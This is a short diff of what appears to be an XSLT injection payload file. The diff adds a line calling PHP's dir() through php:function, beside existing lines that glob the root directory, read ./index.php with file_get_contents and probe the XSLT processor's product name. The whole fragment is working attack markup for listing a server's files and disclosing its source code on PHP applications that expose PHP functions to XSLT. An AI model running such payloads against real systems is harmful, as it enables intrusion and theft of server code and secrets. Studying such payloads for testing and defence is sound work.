@@ -12,6 +12,8 @@
  
    EXEC : <xsl:value-of select="php:function('glob', '/*', 8192)" /> <br />
    
+   EXEC : <xsl:value-of select="php:function('dir', './')" /> <br />
+   
    EXEC : <xsl:value-of select="php:function('file_get_contents', './index.php')" /> <br />
  
  <xsl:if test="system-property('xsl:product-name')">
